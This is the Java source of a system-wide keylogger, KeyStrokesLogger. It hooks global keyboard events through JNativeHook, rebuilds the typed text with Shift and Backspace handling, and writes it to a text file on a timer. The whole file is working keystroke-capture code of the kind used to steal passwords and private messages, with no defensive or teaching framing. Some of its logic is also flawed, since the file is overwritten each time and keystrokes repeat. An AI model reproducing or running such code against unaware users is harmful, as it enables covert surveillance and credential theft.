import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.awt.*;
import java.awt.event.AWTEventListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;

public class KeyStrokesLogger implements NativeKeyListener{
    //fields
    private Timer timer;
    private int specifiedMinutes;
    private ArrayList<String> keyActionsList;
    private String keyStrokesOutput;
    private String nameOfTextFile;


    //constructor method
    public KeyStrokesLogger(int specifiedMinutes, String nameOfTextFile) {
        GlobalScreen.addNativeKeyListener(this);
        keyActionsList = new ArrayList<String>();
        keyStrokesOutput = "";
        this.specifiedMinutes = specifiedMinutes;
        this.nameOfTextFile = nameOfTextFile;
        //create a timer that writes to keystrokes to text file every specified number of minutes
        timer = new Timer();
        timer.schedule(new TimerTask() {
            int count = 0;
            @Override
            public void run() {
                count++;
                int minutes = count / 60;
                if(minutes == specifiedMinutes){
                    count = 0;
                    try {
                        saveKeyStrokes(0, false);
                    } catch (AWTException e) {
                        throw new RuntimeException(e);
                    }
                    String fileName = nameOfTextFile;
                    fileName += ".txt";
                    File file = new File(fileName);
                    if(file.exists()){
                        try {
                            BufferedWriter writer = new BufferedWriter(new FileWriter(file));
                            writer.write(keyStrokesOutput);
                            writer.newLine();
                            writer.close();
                            keyStrokesOutput = "";
                            if(keyActionsList.size() > 2500){ //clear keystrokes when it reaches a certain size so that it does not run out of heap space
                                keyActionsList.clear();
                            }
                        } catch (IOException e) {
                            //do nothing
                        }

                    }else{
                        try {
                            BufferedWriter writer = new BufferedWriter(new FileWriter(file));
                            writer.write(keyStrokesOutput);
                            writer.newLine();
                            writer.close();
                            keyStrokesOutput = "";
                        } catch (IOException e) {
                            //do nothing
                        }

                    }


                }

            }
        },0,1000);




    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        //not using
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        String action = "pressed";
        action += NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        keyActionsList.add(action);
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        String text = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        if(text.equals("Shift") || text.equals("Unknown keyCode: 0xe36")){
            String action = "released" + text;
            keyActionsList.add(action);
        }




    }
    public int saveKeyStrokes(int startIndex, boolean shiftPressed) throws AWTException { //becomes a recursive method if you hold the shift button
        for(int i=startIndex; i<keyActionsList.size()-1; i++){
            switch(keyActionsList.get(i)){
                case "pressedA":
                    if(!shiftPressed){
                        keyStrokesOutput += "a";

                    }else{
                        keyStrokesOutput += "A";

                    }
                    break;

                case "pressedB":
                    if(!shiftPressed){
                        keyStrokesOutput += "b";
                    }else{
                        keyStrokesOutput += "B";

                    }
                    break;
                case "pressedC":
                    if(!shiftPressed){
                        keyStrokesOutput += "c";
                    }else{
                        keyStrokesOutput += "C";

                    }
                    break;
                case "pressedD":
                    if(!shiftPressed){
                        keyStrokesOutput += "d";
                    }else{
                        keyStrokesOutput += "D";
                    }
                    break;
                case "pressedE":
                    if(!shiftPressed){
                        keyStrokesOutput += "e";
                    }else{
                        keyStrokesOutput += "E";
                    }
                    break;
                case "pressedF":
                    if(!shiftPressed){
                        keyStrokesOutput += "f";
                    }else{
                        keyStrokesOutput += "F";
                    }
                    break;
                case "pressedG":
                    if(!shiftPressed){
                        keyStrokesOutput += "g";
                    }else{
                        keyStrokesOutput += "G";
                    }
                    break;
                case "pressedH":
                    if(!shiftPressed){
                        keyStrokesOutput += "h";
                    }else{
                        keyStrokesOutput += "H";
                    }
                    break;
                case "pressedI":
                    if(!shiftPressed){
                        keyStrokesOutput += "i";
                    }else{
                        keyStrokesOutput += "I";
                    }
                    break;
                case "pressedJ":
                    if(!shiftPressed){
                        keyStrokesOutput += "j";
                    }else{
                        keyStrokesOutput += "J";
                    }
                    break;
                case "pressedK":
                    if(!shiftPressed){
                        keyStrokesOutput += "k";
                    }else{
                        keyStrokesOutput += "K";
                    }
                    break;
                case "pressedL":
                    if(!shiftPressed){
                        keyStrokesOutput += "l";
                    }else{
                        keyStrokesOutput += "L";
                    }
                    break;
                case "pressedM":
                    if(!shiftPressed){
                        keyStrokesOutput += "m";
                    }else{
                        keyStrokesOutput += "M";
                    }
                    break;
                case "pressedN":
                    if(!shiftPressed){
                        keyStrokesOutput += "n";
                    }else{
                        keyStrokesOutput += "N";
                    }
                    break;
                case "pressedO":
                    if(!shiftPressed){
                        keyStrokesOutput += "o";
                    }else{
                        keyStrokesOutput += "O";
                    }
                    break;
                case "pressedP":
                    if(!shiftPressed){
                        keyStrokesOutput += "p";
                    }else{
                        keyStrokesOutput += "P";
                    }
                    break;
                case "pressedQ":
                    if(!shiftPressed){
                        keyStrokesOutput += "q";
                    }else{
                        keyStrokesOutput += "Q";
                    }
                    break;
                case "pressedR":
                    if(!shiftPressed){
                        keyStrokesOutput += "r";
                    }else{
                        keyStrokesOutput += "R";
                    }
                    break;
                case "pressedS":
                    if(!shiftPressed){
                        keyStrokesOutput += "s";
                    }else{
                        keyStrokesOutput += "S";
                    }
                    break;
                case "pressedT":
                    if(!shiftPressed){
                        keyStrokesOutput += "t";
                    }else{
                        keyStrokesOutput += "T";
                    }
                    break;
                case "pressedU":
                    if(!shiftPressed){
                        keyStrokesOutput += "u";
                    }else{
                        keyStrokesOutput += "U";
                    }
                    break;
                case "pressedV":
                    if(!shiftPressed){
                        keyStrokesOutput += "v";
                    }else{
                        keyStrokesOutput += "V";
                    }
                    break;
                case "pressedW":
                    if(!shiftPressed){
                        keyStrokesOutput += "w";
                    }else{
                        keyStrokesOutput += "W";
                    }
                    break;
                case "pressedX":
                    if(!shiftPressed){
                        keyStrokesOutput += "x";
                    }else{
                        keyStrokesOutput += "X";
                    }
                    break;
                case "pressedY":
                    if(!shiftPressed){
                        keyStrokesOutput += "y";
                    }else{
                        keyStrokesOutput += "Y";
                    }
                    break;
                case "pressedZ":
                    if(!shiftPressed){
                        keyStrokesOutput += "z";
                    }else{
                        keyStrokesOutput += "Z";
                    }
                    break;
                case "pressed1":
                    if(!shiftPressed){
                        keyStrokesOutput += "1";
                    }else{
                        keyStrokesOutput += "!";
                    }
                    break;
                case "pressed2":
                    if(!shiftPressed){
                        keyStrokesOutput += "2";
                    }else{
                        keyStrokesOutput += "@";
                    }
                    break;
                case "pressed3":
                    if(!shiftPressed){
                        keyStrokesOutput += "3";
                    }else{
                        keyStrokesOutput += "#";
                    }
                    break;
                case "pressed4":
                    if(!shiftPressed){
                        keyStrokesOutput += "4";
                    }else{
                        keyStrokesOutput += "$";
                    }
                    break;
                case "pressed5":
                    if(!shiftPressed){
                        keyStrokesOutput += "5";
                    }else{
                        keyStrokesOutput += "%";
                    }
                    break;
                case "pressed6":
                    if(!shiftPressed){
                        keyStrokesOutput += "6";
                    }else{
                        keyStrokesOutput += "^";
                    }
                    break;
                case "pressed7":
                    if(!shiftPressed){
                        keyStrokesOutput += "7";
                    }else{
                        keyStrokesOutput += "&";
                    }
                    break;
                case "pressed8":
                    if(!shiftPressed){
                        keyStrokesOutput += "8";
                    }else{
                        keyStrokesOutput += "*";
                    }
                    break;
                case "pressed9":
                    if(!shiftPressed){
                        keyStrokesOutput += "9";
                    }else{
                        keyStrokesOutput += "(";
                    }
                    break;
                case "pressed0":
                    if(!shiftPressed){
                        keyStrokesOutput += "0";
                    }else{
                        keyStrokesOutput += ")";
                    }
                    break;

                case "pressedBack Quote":
                    if(!shiftPressed){
                        keyStrokesOutput += "`";
                    }else{
                        keyStrokesOutput += "~";
                    }
                    break;

                case "pressedMinus":
                    if(!shiftPressed){
                        keyStrokesOutput += "-";
                    }else{
                        keyStrokesOutput += "_";
                    }
                    break;
                case "pressedEquals":
                    if(!shiftPressed){
                        keyStrokesOutput += "=";
                    }else{
                        keyStrokesOutput += "+";
                    }
                    break;
                case "pressedOpen Bracket":
                    if(!shiftPressed){
                        keyStrokesOutput += "[";
                    }else{
                        keyStrokesOutput += "{";
                    }
                    break;
                case "pressedClose Bracket":
                    if(!shiftPressed){
                        keyStrokesOutput += "]";
                    }else{
                        keyStrokesOutput += "}";
                    }
                    break;
                case "pressedBack Slash":
                    if(!shiftPressed){
                        keyStrokesOutput += "\\";
                    }else{
                        keyStrokesOutput += "|";
                    }
                    break;
                case "pressedSemicolon":
                    if(!shiftPressed){
                        keyStrokesOutput += ";";
                    }else{
                        keyStrokesOutput += ":";
                    }
                    break;
                case "pressedQuote":
                    if(!shiftPressed){
                        keyStrokesOutput += "'";
                    }else{
                        keyStrokesOutput += "\"";
                    }
                    break;
                case "pressedComma":
                    if(!shiftPressed){
                        keyStrokesOutput += ",";
                    }else{
                        keyStrokesOutput += "<";
                    }
                    break;
                case "pressedPeriod":
                    if(!shiftPressed){
                        keyStrokesOutput += ".";
                    }else{
                        keyStrokesOutput += ">";
                    }
                    break;
                case "pressedSlash":
                    if(!shiftPressed){
                        keyStrokesOutput += "/";
                    }else{
                        keyStrokesOutput += "?";
                    }
                    break;
                case "pressedSpace":
                    if(!shiftPressed){
                        keyStrokesOutput += " ";
                    }else{
                        keyStrokesOutput += " ";
                    }
                    break;

                case "pressedUnknown keyCode: 0xe36": //the shift button on the right
                    startIndex = saveKeyStrokes(i+1,true);
                    i = startIndex-1;
                    break;

                case "releasedUnknown keyCode: 0xe36":
                    if(shiftPressed){
                        shiftPressed = false;
                        return i+1;
                    }
                    break;



                case "pressedBackspace":
                    if(!shiftPressed){
                        if(keyStrokesOutput.length() > 1){
                            keyStrokesOutput = keyStrokesOutput.substring(0,keyStrokesOutput.length()-1);
                        }
                    }else{
                        keyStrokesOutput = keyStrokesOutput.substring(0,keyStrokesOutput.length()-1);
                    }
                    break;

                    case "releasedShift":
                        if(shiftPressed){
                            shiftPressed = false;
                            return i+1;
                        }
                        break;

                case "pressedShift":
                    startIndex = saveKeyStrokes(i+1,true);
                    i = startIndex-1;
                    break;

                case "pressedEnter":
                    if(!shiftPressed){
                        keyStrokesOutput += " ";
                    }else{
                        keyStrokesOutput += " ";
                    }
                    break;

            }
        }

        return 1; //successful
    }

}
